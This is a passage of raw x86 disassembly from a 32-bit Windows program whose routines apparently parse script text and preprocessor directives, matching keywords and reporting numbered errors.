  407922:	mov    eax,ds:0x431f2c
  407927:	jmp    0x407966
  407929:	mov    ecx,DWORD PTR ds:0x431f2c
  40792f:	add    edx,0x400
  407935:	mov    DWORD PTR ds:0x431f24,edx
  40793b:	test   ecx,ecx
  40793d:	jne    0x407955
  40793f:	lea    eax,[edx+0x1]
  407942:	push   0x2
  407944:	pop    edx
  407945:	mul    edx
  407947:	seto   cl
  40794a:	neg    ecx
  40794c:	or     ecx,eax
  40794e:	call   0x40a2fb
  407953:	jmp    0x407961
  407955:	lea    edx,[edx*2+0x2]
  40795c:	call   0x40a33e
  407961:	mov    ds:0x431f2c,eax
  407966:	push   DWORD PTR ds:0x421f0c
  40796c:	mov    WORD PTR [eax+edi*2],si
  407970:	inc    edi
  407971:	call   ebx
  407973:	pop    ecx
  407974:	movzx  ecx,ax
  407977:	mov    dl,0x1
  407979:	call   0x409457
  40797e:	movzx  esi,ax
  407981:	push   0x23
  407983:	pop    edx
  407984:	push   0x2
  407986:	pop    ecx
  407987:	cmp    si,dx
  40798a:	jne    0x4078fb
  407990:	mov    eax,ds:0x431f2c
  407995:	xor    ecx,ecx
  407997:	mov    WORD PTR [eax+edi*2],cx
  40799b:	cmp    si,dx
  40799e:	jne    0x4079c9
  4079a0:	push   DWORD PTR ds:0x421f0c
  4079a6:	call   ebx
  4079a8:	pop    ecx
  4079a9:	push   0xa
  4079ab:	pop    edi
  4079ac:	jmp    0x4079c1
  4079ae:	mov    eax,0xffff
  4079b3:	cmp    si,ax
  4079b6:	je     0x4079d3
  4079b8:	push   DWORD PTR ds:0x421f0c
  4079be:	call   ebx
  4079c0:	pop    ecx
  4079c1:	movzx  esi,ax
  4079c4:	cmp    si,di
  4079c7:	jne    0x4079ae
  4079c9:	mov    eax,0xffff
  4079ce:	cmp    si,ax
  4079d1:	jne    0x4079e2
  4079d3:	push   DWORD PTR ds:0x421f0c
  4079d9:	push   esi
  4079da:	call   DWORD PTR ds:0x437464
  4079e0:	pop    ecx
  4079e1:	pop    ecx
  4079e2:	mov    ecx,DWORD PTR ds:0x431f2c
  4079e8:	pop    edi
  4079e9:	pop    esi
  4079ea:	pop    ebx
  4079eb:	jmp    0x40e627
  4079f0:	push   ebp
  4079f1:	mov    ebp,esp
  4079f3:	sub    esp,0xc
  4079f6:	push   ebx
  4079f7:	push   esi
  4079f8:	push   edi
  4079f9:	mov    eax,ecx
  4079fb:	push   0x20
  4079fd:	movzx  ecx,WORD PTR [eax]
  407a00:	pop    edi
  407a01:	mov    ebx,edx
  407a03:	mov    esi,eax
  407a05:	push   0x9
  407a07:	mov    DWORD PTR [ebp-0x4],eax
  407a0a:	mov    BYTE PTR [ebx],0x0
  407a0d:	mov    DWORD PTR [ebp-0x8],esi
  407a10:	mov    DWORD PTR [ebp-0xc],edi
  407a13:	pop    edx
  407a14:	test   cx,cx
  407a17:	je     0x407a31
  407a19:	cmp    cx,di
  407a1c:	je     0x407a2e
  407a1e:	cmp    cx,dx
  407a21:	je     0x407a2e
  407a23:	add    esi,0x2
  407a26:	movzx  ecx,WORD PTR [esi]
  407a29:	test   cx,cx
  407a2c:	jne    0x407a19
  407a2e:	mov    DWORD PTR [ebp-0x8],esi
  407a31:	movzx  ecx,WORD PTR [esi]
  407a34:	mov    edi,esi
  407a36:	sub    edi,eax
  407a38:	sar    edi,1
  407a3a:	test   cx,cx
  407a3d:	je     0x407a58
  407a3f:	cmp    cx,WORD PTR [ebp-0xc]
  407a43:	je     0x407a4a
  407a45:	cmp    cx,dx
  407a48:	jne    0x407a55
  407a4a:	add    esi,0x2
  407a4d:	movzx  ecx,WORD PTR [esi]
  407a50:	test   cx,cx
  407a53:	jne    0x407a3f
  407a55:	mov    DWORD PTR [ebp-0x8],esi
  407a58:	push   0x7
  407a5a:	push   0x401770
  407a5f:	push   eax
  407a60:	call   DWORD PTR ds:0x437414
  407a66:	add    esp,0xc
  407a69:	test   eax,eax
  407a6b:	jne    0x407a7a
  407a6d:	cmp    edi,0x7
  407a70:	jne    0x407a7a
  407a72:	mov    BYTE PTR [ebx],0x9
  407a75:	jmp    0x407b31
  407a7a:	push   0xb
  407a7c:	push   0x401780
  407a81:	push   DWORD PTR [ebp-0x4]
  407a84:	call   DWORD PTR ds:0x437414
  407a8a:	add    esp,0xc
  407a8d:	test   eax,eax
  407a8f:	jne    0x407a9e
  407a91:	cmp    edi,0xb
  407a94:	jne    0x407a9e
  407a96:	mov    BYTE PTR [ebx],0xa
  407a99:	jmp    0x407b31
  407a9e:	push   0x5
  407aa0:	push   0x401798
  407aa5:	push   DWORD PTR [ebp-0x4]
  407aa8:	call   DWORD PTR ds:0x437414
  407aae:	add    esp,0xc
  407ab1:	test   eax,eax
  407ab3:	jne    0x407abf
  407ab5:	cmp    edi,0x5
  407ab8:	jne    0x407abf
  407aba:	mov    BYTE PTR [ebx],0xb
  407abd:	jmp    0x407b31
  407abf:	push   0x7
  407ac1:	push   0x4017a4
  407ac6:	push   DWORD PTR [ebp-0x4]
  407ac9:	call   DWORD PTR ds:0x437414
  407acf:	add    esp,0xc
  407ad2:	test   eax,eax
  407ad4:	jne    0x407ae0
  407ad6:	cmp    edi,0x7
  407ad9:	jne    0x407ae0
  407adb:	mov    BYTE PTR [ebx],0xc
  407ade:	jmp    0x407b31
  407ae0:	push   0x5
  407ae2:	push   0x4017b4
  407ae7:	push   DWORD PTR [ebp-0x4]
  407aea:	call   DWORD PTR ds:0x437414
  407af0:	add    esp,0xc
  407af3:	test   eax,eax
  407af5:	jne    0x407b01
  407af7:	cmp    edi,0x5
  407afa:	jne    0x407b01
  407afc:	mov    BYTE PTR [ebx],0xd
  407aff:	jmp    0x407b31
  407b01:	mov    ecx,DWORD PTR [ebp-0x4]
  407b04:	lea    eax,[ebp-0x8]
  407b07:	push   eax
  407b08:	mov    edx,edi
  407b0a:	call   0x407ca1
  407b0f:	mov    BYTE PTR [ebx],al
  407b11:	test   al,al
  407b13:	jne    0x407b2e
  407b15:	push   DWORD PTR ds:0x431f2c
  407b1b:	push   0x3f9
  407b20:	push   DWORD PTR ds:0x4216d4
  407b26:	call   0x405021
  407b2b:	add    esp,0xc
  407b2e:	mov    esi,DWORD PTR [ebp-0x8]
  407b31:	pop    edi
  407b32:	mov    eax,esi
  407b34:	pop    esi
  407b35:	pop    ebx
  407b36:	leave  
  407b37:	ret    
  407b38:	push   ebx
  407b39:	push   esi
  407b3a:	mov    esi,ecx
  407b3c:	push   edi
  407b3d:	movzx  eax,WORD PTR [esi]
  407b40:	test   ax,ax
  407b43:	je     0x407c9d
  407b49:	mov    edi,DWORD PTR ds:0x437540
  407b4f:	mov    ebx,DWORD PTR ds:0x43740c
  407b55:	push   0x2b
  407b57:	pop    edx
  407b58:	movzx  ecx,ax
  407b5b:	sub    ecx,edx
  407b5d:	je     0x407b92
  407b5f:	dec    ecx
  407b60:	dec    ecx
  407b61:	je     0x407c13
  407b67:	cmp    ax,0x20
  407b6b:	je     0x407c84
  407b71:	cmp    ax,0x9
  407b75:	je     0x407c84
  407b7b:	push   0x400
  407b80:	push   DWORD PTR ds:0x4216d4
  407b86:	call   0x405021
  407b8b:	pop    ecx
  407b8c:	pop    ecx
  407b8d:	jmp    0x407c84
  407b92:	add    esi,0x2
  407b95:	movzx  eax,WORD PTR [esi]
  407b98:	test   ax,ax
  407b9b:	je     0x407c9d
  407ba1:	cmp    ax,0x2d
  407ba5:	je     0x407c05
  407ba7:	push   eax
  407ba8:	call   ebx
  407baa:	movzx  eax,ax
  407bad:	pop    ecx
  407bae:	push   eax
  407baf:	push   0x4017c0
  407bb4:	call   edi
  407bb6:	pop    ecx
  407bb7:	pop    ecx
  407bb8:	test   eax,eax
  407bba:	jne    0x407bdc
  407bbc:	cmp    BYTE PTR ds:0x421f11,al
  407bc2:	je     0x407be8
  407bc4:	movzx  eax,WORD PTR [esi]
  407bc7:	push   eax
  407bc8:	call   ebx
  407bca:	movzx  eax,ax
  407bcd:	pop    ecx
  407bce:	push   eax
  407bcf:	push   0x4017cc
  407bd4:	call   edi
  407bd6:	pop    ecx
  407bd7:	pop    ecx
  407bd8:	test   eax,eax
  407bda:	je     0x407be8
  407bdc:	mov    cx,WORD PTR [esi]
  407bdf:	mov    dl,0x1
  407be1:	call   0x40bd70
  407be6:	jmp    0x407bfa
  407be8:	push   0x400
  407bed:	push   DWORD PTR ds:0x4216d4
  407bf3:	call   0x405021
  407bf8:	pop    ecx
  407bf9:	pop    ecx
  407bfa:	add    esi,0x2
  407bfd:	movzx  eax,WORD PTR [esi]
  407c00:	test   ax,ax
  407c03:	jne    0x407ba1
  407c05:	xor    eax,eax
  407c07:	cmp    WORD PTR [esi],ax
  407c0a:	je     0x407c9d
  407c10:	push   0x2b
  407c12:	pop    edx
  407c13:	add    esi,0x2
  407c16:	movzx  eax,WORD PTR [esi]
  407c19:	test   ax,ax
  407c1c:	je     0x407c9d
  407c1e:	cmp    ax,dx
  407c21:	je     0x407c84
  407c23:	push   eax
  407c24:	call   ebx
  407c26:	movzx  eax,ax
  407c29:	pop    ecx
  407c2a:	push   eax
  407c2b:	push   0x4017c0
  407c30:	call   edi
  407c32:	pop    ecx
  407c33:	pop    ecx
  407c34:	test   eax,eax
  407c36:	jne    0x407c58
  407c38:	cmp    BYTE PTR ds:0x421f11,al
  407c3e:	je     0x407c64
  407c40:	movzx  eax,WORD PTR [esi]
  407c43:	push   eax
  407c44:	call   ebx
  407c46:	movzx  eax,ax
  407c49:	pop    ecx
  407c4a:	push   eax
  407c4b:	push   0x4017e4
  407c50:	call   edi
  407c52:	pop    ecx
  407c53:	pop    ecx
  407c54:	test   eax,eax
  407c56:	je     0x407c64
  407c58:	mov    cx,WORD PTR [esi]
  407c5b:	xor    dl,dl
  407c5d:	call   0x40bd70
  407c62:	jmp    0x407c76
  407c64:	push   0x400
  407c69:	push   DWORD PTR ds:0x4216d4
  407c6f:	call   0x405021
  407c74:	pop    ecx
  407c75:	pop    ecx
  407c76:	add    esi,0x2
  407c79:	push   0x2b
  407c7b:	movzx  eax,WORD PTR [esi]
  407c7e:	pop    edx
  407c7f:	test   ax,ax
  407c82:	jne    0x407c1e
  407c84:	xor    eax,eax
  407c86:	cmp    WORD PTR [esi],ax
  407c89:	je     0x407c9d
  407c8b:	add    esi,0x2
  407c8e:	push   0x2b
  407c90:	movzx  eax,WORD PTR [esi]
  407c93:	pop    edx
  407c94:	test   ax,ax
  407c97:	jne    0x407b58
  407c9d:	pop    edi
  407c9e:	pop    esi
  407c9f:	pop    ebx
  407ca0:	ret    
  407ca1:	push   ebp
  407ca2:	mov    ebp,esp
  407ca4:	push   ecx
  407ca5:	push   ecx
  407ca6:	push   ebx
  407ca7:	push   esi
  407ca8:	push   edi
  407ca9:	mov    edi,DWORD PTR ds:0x437414
  407caf:	push   0x2
  407cb1:	mov    eax,ecx
  407cb3:	push   0x401800
  407cb8:	push   eax
  407cb9:	mov    esi,edx
  407cbb:	mov    DWORD PTR [ebp-0x4],eax
  407cbe:	xor    bl,bl
  407cc0:	call   edi
  407cc2:	add    esp,0xc
  407cc5:	test   eax,eax
  407cc7:	jne    0x407cd5
  407cc9:	cmp    esi,0x2
  407ccc:	jne    0x407cd5
  407cce:	inc    bl
  407cd0:	jmp    0x407e44
  407cd5:	push   0x5
  407cd7:	push   0x401808
  407cdc:	push   DWORD PTR [ebp-0x4]
  407cdf:	call   edi
  407ce1:	add    esp,0xc
  407ce4:	test   eax,eax
  407ce6:	jne    0x407cf4
  407ce8:	cmp    esi,0x5
  407ceb:	jne    0x407cf4
  407ced:	mov    bl,0x6
  407cef:	jmp    0x407e44
  407cf4:	push   0x6
  407cf6:	push   0x401814
  407cfb:	push   DWORD PTR [ebp-0x4]
  407cfe:	call   edi
  407d00:	add    esp,0xc
  407d03:	test   eax,eax
  407d05:	jne    0x407d13
  407d07:	cmp    esi,0x6
  407d0a:	jne    0x407d13
  407d0c:	mov    bl,0x7
  407d0e:	jmp    0x407e44
  407d13:	push   0x4
  407d15:	push   0x401824
  407d1a:	push   DWORD PTR [ebp-0x4]
  407d1d:	call   edi
  407d1f:	add    esp,0xc
  407d22:	test   eax,eax
  407d24:	jne    0x407dd6
  407d2a:	cmp    esi,0x4
  407d2d:	jne    0x407dd6
  407d33:	mov    eax,DWORD PTR [ebp+0x8]
  407d36:	mov    eax,DWORD PTR [eax]
  407d38:	movzx  edx,WORD PTR [eax]
  407d3b:	test   dx,dx
  407d3e:	jne    0x407d47
  407d40:	mov    bl,0x2
  407d42:	jmp    0x407e44
  407d47:	push   0x20
  407d49:	pop    esi
  407d4a:	push   0x9
  407d4c:	mov    DWORD PTR [ebp-0x4],eax
  407d4f:	mov    DWORD PTR [ebp-0x8],esi
  407d52:	pop    ecx
  407d53:	cmp    dx,si
  407d56:	je     0x407d68
  407d58:	cmp    dx,cx
  407d5b:	je     0x407d68
  407d5d:	add    eax,0x2
  407d60:	movzx  edx,WORD PTR [eax]
  407d63:	test   dx,dx
  407d66:	jne    0x407d53
  407d68:	mov    esi,eax
  407d6a:	sub    esi,DWORD PTR [ebp-0x4]
  407d6d:	sar    esi,1
  407d6f:	jmp    0x407d7f
  407d71:	cmp    dx,WORD PTR [ebp-0x8]
  407d75:	je     0x407d7c
  407d77:	cmp    dx,cx
  407d7a:	jne    0x407d87
  407d7c:	add    eax,0x2
  407d7f:	movzx  edx,WORD PTR [eax]
  407d82:	test   dx,dx
  407d85:	jne    0x407d71
  407d87:	mov    ecx,DWORD PTR [ebp+0x8]
  407d8a:	push   0x2
  407d8c:	push   0x401800
  407d91:	push   DWORD PTR [ebp-0x4]
  407d94:	mov    DWORD PTR [ecx],eax
  407d96:	call   edi
  407d98:	add    esp,0xc
  407d9b:	test   eax,eax
  407d9d:	jne    0x407da4
  407d9f:	cmp    esi,0x2
  407da2:	je     0x407dee
  407da4:	push   0x5
  407da6:	push   0x401808
  407dab:	push   DWORD PTR [ebp-0x4]
  407dae:	call   edi
  407db0:	add    esp,0xc
  407db3:	test   eax,eax
  407db5:	jne    0x407dbc
  407db7:	cmp    esi,0x5
  407dba:	je     0x407e0a
  407dbc:	push   0x6
  407dbe:	push   0x401814
  407dc3:	push   DWORD PTR [ebp-0x4]
  407dc6:	call   edi
  407dc8:	add    esp,0xc
  407dcb:	test   eax,eax
  407dcd:	jne    0x407e44
  407dcf:	cmp    esi,0x6
  407dd2:	jne    0x407e44
  407dd4:	jmp    0x407e26
  407dd6:	push   0x6
  407dd8:	push   0x401830
  407ddd:	push   DWORD PTR [ebp-0x4]
  407de0:	call   edi
  407de2:	add    esp,0xc
  407de5:	test   eax,eax
  407de7:	jne    0x407df2
  407de9:	cmp    esi,0x6
  407dec:	jne    0x407df2
  407dee:	mov    bl,0x3
  407df0:	jmp    0x407e44
  407df2:	push   0x9
  407df4:	push   0x401840
  407df9:	push   DWORD PTR [ebp-0x4]
  407dfc:	call   edi
  407dfe:	add    esp,0xc
  407e01:	test   eax,eax
  407e03:	jne    0x407e0e
  407e05:	cmp    esi,0x9
  407e08:	jne    0x407e0e
  407e0a:	mov    bl,0x4
  407e0c:	jmp    0x407e44
  407e0e:	push   0xa
  407e10:	push   0x401854
  407e15:	push   DWORD PTR [ebp-0x4]
  407e18:	call   edi
  407e1a:	add    esp,0xc
  407e1d:	test   eax,eax
  407e1f:	jne    0x407e2a
  407e21:	cmp    esi,0xa
  407e24:	jne    0x407e2a
  407e26:	mov    bl,0x5
  407e28:	jmp    0x407e44
  407e2a:	push   0x5
  407e2c:	push   0x40186c
  407e31:	push   DWORD PTR [ebp-0x4]
  407e34:	call   edi
  407e36:	add    esp,0xc
  407e39:	test   eax,eax
  407e3b:	jne    0x407e44
  407e3d:	cmp    esi,0x5
  407e40:	jne    0x407e44
  407e42:	mov    bl,0x8
  407e44:	pop    edi
  407e45:	pop    esi
  407e46:	mov    al,bl
  407e48:	pop    ebx
  407e49:	leave  
  407e4a:	ret    0x4
  407e4d:	push   ecx
  407e4e:	push   ebx
  407e4f:	push   esi
  407e50:	push   0x2
  407e52:	mov    esi,ecx
  407e54:	pop    ebx
  407e55:	cmp    dl,0x1
  407e58:	je     0x407f37
  407e5e:	cmp    dl,bl
  407e60:	je     0x407f00
  407e66:	jbe    0x407eab
  407e68:	cmp    dl,0x5
  407e6b:	jbe    0x407eaf
  407e6d:	cmp    dl,0x7
  407e70:	jbe    0x407f37
  407e76:	cmp    dl,0x8
  407e79:	jne    0x407eab
  407e7b:	mov    eax,ds:0x411024
  407e80:	test   eax,eax
  407e82:	jns    0x407e96
  407e84:	push   0x401
  407e89:	push   DWORD PTR ds:0x4216d4
  407e8f:	call   0x405021
  407e94:	pop    ecx
  407e95:	pop    ecx
  407e96:	dec    eax
  407e97:	mov    ds:0x411024,eax
  407e9c:	js     0x407eab
  407e9e:	test   BYTE PTR [eax+0x431f30],bl
  407ea4:	jne    0x407eab
  407ea6:	call   0x407f6e
  407eab:	pop    esi
  407eac:	pop    ebx
  407ead:	pop    ecx
  407eae:	ret    
  407eaf:	mov    ecx,DWORD PTR ds:0x411024
  407eb5:	test   ecx,ecx
  407eb7:	js     0x407ef9
  407eb9:	mov    al,BYTE PTR [ecx+0x431f30]
  407ebf:	test   al,0x9
  407ec1:	je     0x407ef9
  407ec3:	and    al,0xfe
  407ec5:	or     al,0x8
  407ec7:	mov    BYTE PTR [ecx+0x431f30],al
  407ecd:	test   al,0x4
  407ecf:	jne    0x407ea6
  407ed1:	test   bl,al
  407ed3:	je     0x407ee1
  407ed5:	and    al,0xfd
  407ed7:	or     al,0x4
  407ed9:	mov    BYTE PTR [ecx+0x431f30],al
  407edf:	jmp    0x407ea6
  407ee1:	mov    ecx,esi
  407ee3:	call   0x40d443
  407ee8:	test   al,al
  407eea:	je     0x407ea6
  407eec:	mov    eax,ds:0x411024
  407ef1:	or     BYTE PTR [eax+0x431f30],bl
  407ef7:	jmp    0x407eab
  407ef9:	push   0x3fd
  407efe:	jmp    0x407e89
  407f00:	mov    ecx,DWORD PTR ds:0x411024
  407f06:	test   ecx,ecx
  407f08:	js     0x407ef9
  407f0a:	mov    al,BYTE PTR [ecx+0x431f30]
  407f10:	test   al,0x9
  407f12:	je     0x407ef9
  407f14:	and    al,0xf6
  407f16:	mov    BYTE PTR [ecx+0x431f30],al
  407f1c:	test   al,0x4
  407f1e:	jne    0x407ea6
  407f20:	test   bl,al
  407f22:	je     0x407f28
  407f24:	and    al,0xfd
  407f26:	jmp    0x407f2a
  407f28:	or     al,bl
  407f2a:	mov    BYTE PTR [ecx+0x431f30],al
  407f30:	test   bl,al
  407f32:	jmp    0x407ea4
  407f37:	mov    eax,ds:0x411024
  407f3c:	cmp    eax,0xf
  407f3f:	jne    0x407f4b
  407f41:	push   0x3fb
  407f46:	jmp    0x407e89
  407f4b:	inc    eax
  407f4c:	mov    ds:0x411024,eax
  407f51:	mov    BYTE PTR [eax+0x431f30],0x1
  407f58:	je     0x407ee3
  407f5a:	test   BYTE PTR [eax+0x431f2f],bl
  407f60:	jne    0x407ee3
  407f62:	mov    BYTE PTR [eax+0x431f30],0x5
  407f69:	jmp    0x407ea6
  407f6e:	push   ebp
  407f6f:	mov    ebp,esp
  407f71:	push   ecx
  407f72:	push   ebx
  407f73:	push   esi
  407f74:	mov    esi,DWORD PTR ds:0x437460
  407f7a:	push   edi
  407f7b:	push   0x21
  407f7d:	pop    ebx
  407f7e:	mov    edi,0xffff
  407f83:	push   DWORD PTR ds:0x421f0c
  407f89:	call   esi
  407f8b:	movzx  eax,ax
  407f8e:	pop    ecx
  407f8f:	cmp    ax,bx
  407f92:	je     0x40802c
  407f98:	cmp    ax,di
  407f9b:	je     0x408027
  407fa1:	inc    DWORD PTR ds:0x4216d4
  407fa7:	push   0x5c
  407fa9:	pop    ecx
  407faa:	cmp    ax,cx
  407fad:	jne    0x407fce
  407faf:	mov    dl,0x1
  407fb1:	call   0x409457
  407fb6:	movzx  eax,ax
  407fb9:	cmp    ax,bx
  407fbc:	jne    0x407fc7
  407fbe:	cmp    BYTE PTR ds:0x411021,0x0
  407fc5:	jne    0x40802c
  407fc7:	mov    BYTE PTR ds:0x411021,0x0
  407fce:	cmp    ax,0x23
  407fd2:	je     0x407ff4
  407fd4:	push   0xa
  407fd6:	pop    ecx
  407fd7:	cmp    ax,cx
  407fda:	je     0x408008
  407fdc:	cmp    ax,di
  407fdf:	je     0x408027
  407fe1:	push   DWORD PTR ds:0x421f0c
  407fe7:	call   esi
  407fe9:	pop    ecx
  407fea:	movzx  eax,ax
  407fed:	jmp    0x407fa7
  407fef:	cmp    ax,di
  407ff2:	je     0x408027
  407ff4:	push   DWORD PTR ds:0x421f0c
  407ffa:	call   esi
  407ffc:	pop    ecx
  407ffd:	push   0xa
  407fff:	movzx  eax,ax
  408002:	pop    ecx
  408003:	cmp    ax,cx
  408006:	jne    0x407fef
  408008:	cmp    ax,di
  40800b:	je     0x408027
  40800d:	cmp    ax,bx
  408010:	je     0x40802c
  408012:	push   DWORD PTR ds:0x421f0c
  408018:	call   esi
  40801a:	movzx  eax,ax
  40801d:	pop    ecx
  40801e:	cmp    ax,bx
  408021:	jne    0x407f98
  408027:	cmp    ax,bx
  40802a:	jne    0x40806a
  40802c:	mov    eax,ds:0x431f28
  408031:	test   eax,eax
  408033:	je     0x408045
  408035:	cmp    eax,DWORD PTR ds:0x431f2c
  40803b:	je     0x408045
  40803d:	push   eax
  40803e:	call   DWORD PTR ds:0x43754c
  408044:	pop    ecx
  408045:	call   0x4078a7
  40804a:	lea    edx,[ebp-0x1]
  40804d:	mov    ecx,eax
  40804f:	mov    ds:0x431f28,eax
  408054:	call   0x4079f0
  408059:	cmp    BYTE PTR [ebp-0x1],0x8
  40805d:	jbe    0x408081
  40805f:	inc    DWORD PTR ds:0x4216d4
  408065:	jmp    0x407f83
  40806a:	cmp    ax,di
  40806d:	jne    0x408081
  40806f:	push   0x3fc
  408074:	push   DWORD PTR ds:0x4216d4
  40807a:	call   0x405021
  40807f:	pop    ecx
  408080:	pop    ecx
  408081:	pop    edi
  408082:	pop    esi
  408083:	pop    ebx
  408084:	leave  
  408085:	ret    
  408086:	push   ebp
  408087:	mov    ebp,esp
  408089:	sub    esp,0xc
  40808c:	push   ebx
  40808d:	xor    ebx,ebx
  40808f:	mov    DWORD PTR [ebp-0x8],ebx
  408092:	mov    DWORD PTR ds:0x4216d4,ebx
  408098:	jmp    0x40811d
  40809d:	cmp    WORD PTR ds:0x4216f0,0x5b
  4080a5:	jne    0x408117
  4080a7:	lea    eax,[ebp-0x4]
  4080aa:	push   eax
  4080ab:	push   0x4015b4
  4080b0:	mov    DWORD PTR [ebp-0x4],ebx
  4080b3:	push   0x4216f2
  4080b8:	call   DWORD PTR ds:0x4373c8
  4080be:	mov    ecx,eax
  4080c0:	add    esp,0xc
  4080c3:	test   ecx,ecx
  4080c5:	je     0x408115
  4080c7:	test   bl,bl
  4080c9:	jne    0x408115
  4080cb:	mov    edx,ecx
  4080cd:	lea    eax,[edx+0x2]
  4080d0:	mov    DWORD PTR [ebp-0xc],eax
  4080d3:	mov    ax,WORD PTR [edx]
  4080d6:	add    edx,0x2
  4080d9:	cmp    ax,WORD PTR [ebp-0x8]
  4080dd:	jne    0x4080d3
  4080df:	sub    edx,DWORD PTR [ebp-0xc]
  4080e2:	sar    edx,1
  4080e4:	cmp    WORD PTR [ecx+edx*2-0x2],0x5d
  4080ea:	jne    0x4080f5
  4080ec:	xor    eax,eax
  4080ee:	mov    bl,0x1
  4080f0:	mov    WORD PTR [ecx+edx*2-0x2],ax
  4080f5:	push   0x402460
  4080fa:	push   ecx
  4080fb:	call   DWORD PTR ds:0x437548
  408101:	pop    ecx
  408102:	pop    ecx
  408103:	test   eax,eax
  408105:	je     0x40816b
  408107:	lea    eax,[ebp-0x4]
  40810a:	push   eax
  40810b:	push   0x4015b4
  408110:	xor    eax,eax
  408112:	push   eax
  408113:	jmp    0x4080b8
  408115:	xor    ebx,ebx
  408117:	inc    DWORD PTR ds:0x4216d4
  40811d:	push   DWORD PTR ds:0x421f0c
  408123:	push   0x400
  408128:	push   0x4216f0
  40812d:	call   DWORD PTR ds:0x4373d8
  408133:	add    esp,0xc
  408136:	test   eax,eax
  408138:	jne    0x40809d
  40813e:	push   DWORD PTR ds:0x421f0c
  408144:	call   DWORD PTR ds:0x437468
  40814a:	pop    ecx
  40814b:	test   eax,eax
  40814d:	jne    0x408166
  40814f:	mov    eax,ds:0x4216d4
  408154:	push   0x41d
  408159:	push   ebx
  40815a:	mov    ds:0x4216e0,eax
  40815f:	call   0x405021
  408164:	pop    ecx
  408165:	pop    ecx
  408166:	xor    al,al
  408168:	pop    ebx
  408169:	leave  
  40816a:	ret    
  40816b:	mov    al,0x1
  40816d:	jmp    0x408168
  40816f:	push   esi
  408170:	mov    esi,ecx
  408172:	push   edi
  408173:	lea    edi,[esi+edx*2]
  408176:	jmp    0x408199
  408178:	mov    ecx,0xffff
  40817d:	cmp    ax,cx
  408180:	je     0x4081d6
  408182:	mov    WORD PTR [esi],ax
  408185:	add    esi,0x2
  408188:	cmp    esi,edi
  40818a:	je     0x4081bf
  40818c:	cmp    ax,0xa
  408190:	je     0x4081ab
  408192:	mov    BYTE PTR ds:0x411021,0x0
  408199:	call   0x4076fe
  40819e:	movzx  eax,ax
  4081a1:	test   ax,ax
  4081a4:	jne    0x408178
  4081a6:	mov    eax,esi
  4081a8:	pop    edi
  4081a9:	pop    esi
  4081aa:	ret    
  4081ab:	inc    DWORD PTR ds:0x4216d4
  4081b1:	xor    eax,eax
  4081b3:	mov    BYTE PTR ds:0x411021,0x1
  4081ba:	mov    WORD PTR [esi],ax
  4081bd:	jmp    0x4081a6
  4081bf:	push   DWORD PTR ds:0x421f0c
  4081c5:	xor    ecx,ecx
  4081c7:	push   eax
  4081c8:	mov    WORD PTR [esi-0x2],cx
  4081cc:	call   DWORD PTR ds:0x437464
  4081d2:	pop    ecx
  4081d3:	pop    ecx
  4081d4:	jmp    0x4081a6
  4081d6:	xor    eax,eax
  4081d8:	mov    WORD PTR [esi],ax
  4081db:	jmp    0x4081a8
  4081dd:	push   esi
  4081de:	push   edi
  4081df:	mov    edi,ecx
  4081e1:	push   0xa
  4081e3:	push   edi
  4081e4:	jmp    0x40825a
  4081e6:	cmp    esi,edi
  4081e8:	jbe    0x4081f1
  4081ea:	cmp    WORD PTR [esi-0x2],0x5e
  4081ef:	jne    0x40826c
  4081f1:	push   DWORD PTR ds:0x421f0c
  4081f7:	add    esi,0x2
  4081fa:	mov    ecx,esi
  4081fc:	sub    ecx,edi
  4081fe:	sar    ecx,1
  408200:	mov    eax,0x400
  408205:	sub    eax,ecx
  408207:	push   eax
  408208:	push   esi
  408209:	call   DWORD PTR ds:0x4373d8
  40820f:	add    esp,0xc
  408212:	test   eax,eax
  408214:	jne    0x408251
  408216:	push   DWORD PTR ds:0x421f0c
  40821c:	call   DWORD PTR ds:0x437468
  408222:	pop    ecx
  408223:	test   eax,eax
  408225:	je     0x40823f
  408227:	push   0x401878
  40822c:	push   0x409
  408231:	push   DWORD PTR ds:0x4216d4
  408237:	call   0x405021
  40823c:	add    esp,0xc
  40823f:	push   0x41d
  408244:	push   DWORD PTR ds:0x4216d4
  40824a:	call   0x405021
  40824f:	pop    ecx
  408250:	pop    ecx
  408251:	inc    DWORD PTR ds:0x4216d4
  408257:	push   0xa
  408259:	push   esi
  40825a:	call   DWORD PTR ds:0x437540
  408260:	mov    esi,eax
  408262:	pop    ecx
  408263:	pop    ecx
  408264:	test   esi,esi
  408266:	jne    0x4081e6
  40826c:	pop    edi
  40826d:	pop    esi
  40826e:	ret    
  40826f:	push   ebp
  408270:	mov    ebp,esp
  408272:	sub    esp,0xc
  408275:	push   ebx
  408276:	push   esi
  408277:	push   edi
  408278:	mov    edi,ecx
  40827a:	push   0x3c
  40827c:	mov    eax,DWORD PTR [edi]
  40827e:	xor    ebx,ebx
  408280:	pop    ecx
  408281:	mov    DWORD PTR [ebp-0xc],edi
  408284:	mov    esi,0x432430
  408289:	mov    BYTE PTR [ebp-0x1],bl
  40828c:	mov    DWORD PTR [ebp-0x8],ecx
  40828f:	push   ecx
  408290:	push   eax
  408291:	call   DWORD PTR ds:0x437540
  408297:	pop    ecx
  408298:	pop    ecx
  408299:	test   eax,eax
  40829b:	je     0x40838d
  4082a1:	push   0x3c
  4082a3:	add    eax,0x2
  4082a6:	pop    ecx
  4082a7:	cmp    WORD PTR [eax],cx
  4082aa:	jne    0x4082ae
  4082ac:	mov    bl,0x1
  4082ae:	test   bl,bl
  4082b0:	je     0x40828f
  4082b2:	push   0x2
  4082b4:	pop    ebx
  4082b5:	add    eax,ebx
  4082b7:	movzx  ecx,WORD PTR [eax]
  4082ba:	test   cx,cx
  4082bd:	je     0x40837f
  4082c3:	push   0xa
  4082c5:	pop    edx
  4082c6:	push   0x24
  4082c8:	pop    edi
  4082c9:	cmp    cx,0x3e
  4082cd:	je     0x40837c
  4082d3:	cmp    cx,WORD PTR [ebp-0x8]
  4082d7:	je     0x40837c
  4082dd:	cmp    cx,0x5e
  4082e1:	je     0x40837c
  4082e7:	cmp    cx,0x2c
  4082eb:	je     0x40837c
  4082f1:	cmp    cx,0x9
  4082f5:	je     0x40837c
  4082fb:	cmp    cx,dx
  4082fe:	je     0x40837c
  408300:	cmp    cx,0x22
  408304:	jne    0x408312
  408306:	cmp    BYTE PTR [ebp-0x1],0x0
  40830a:	sete   dl
  40830d:	mov    BYTE PTR [ebp-0x1],dl
  408310:	jmp    0x408315
  408312:	mov    dl,BYTE PTR [ebp-0x1]
  408315:	cmp    cx,0x20
  408319:	jne    0x40831f
  40831b:	test   dl,dl
  40831d:	je     0x40837c
  40831f:	cmp    cx,di
